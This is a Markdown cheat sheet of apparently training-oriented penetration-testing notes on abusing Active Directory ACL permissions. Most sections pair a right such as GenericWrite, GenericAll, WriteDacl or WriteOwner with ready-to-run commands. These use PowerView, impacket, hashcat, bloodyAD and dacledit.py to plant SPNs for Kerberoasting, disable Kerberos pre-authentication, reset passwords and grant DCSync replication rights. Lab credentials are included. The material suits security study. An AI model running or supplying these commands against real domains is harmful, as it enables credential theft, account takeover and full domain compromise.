# ACL

### Addself

    Addself abused with Add-DomainGroupMember

Shows security groups that a user can add themselves to.

### ForceChangePassword

    Abused with Set-DomainUserPassword
    https://github.com/Andre92Marcos/tools/blob/master/powersploit/PowerView.md#functions

Gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

### GenericWrite

    Abused with Set-DomainObject

Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.

Example:

```powershell
# Create a cred object of the user the has the GenericWrite acl
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)

#Next we'll use Set-DomainObject to set a fake SPN on the target account. We'll create an SPN named acmetesting/LEGIT
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```
```shell
#Finally we can use impacket to get the tgt of th target account
impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
#And then crack
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

It also allows for a ShadowCredentials attack.


### GenericAll

    Abused with Set-DomainUserPassword or Add-DomainGroupMember

This grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

We can also add the dont_req_preauth setting so that the account is ASREProastable:

```
bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k add uac <username_of_target_account> -f DONT_REQ_PREAUTH
```

We can also use bloodyAD to change a target user's password.

### WriteDacl

This abuse can be carried out when controlling an object that has WriteDacl over another object.

Instead of giving full control, the same process can be applied to allow an object to DCSync by adding two ACEs with specific Extended Rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). Giving full control leads to the same thing since GenericAll includes all ExtendedRights, hence the two extended rights needed for DCSync to work.

Using dacledit.py

```
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```

```
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
```

Using bloodyAd

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```

```
# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
```

Using PowerView

```powershell
$SecPassword = ConvertTo-SecureString '<password_of_controlled_user_with_WriteDacl>' -AsPlainText -Force
#$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<controlled_user>', $SecPassword)
#$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity <user_that_is_gonna_receive_the_dcsync_acls> -Rights DCSync
#Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -Rights DCSync
```

### WriteOwner

    Abuse with bloodyAD

    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <group_name> <name_of_new_owner>
    dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>' # to give full control

https://github.com/Andre92Marcos/tools/tree/master/bloodyAD
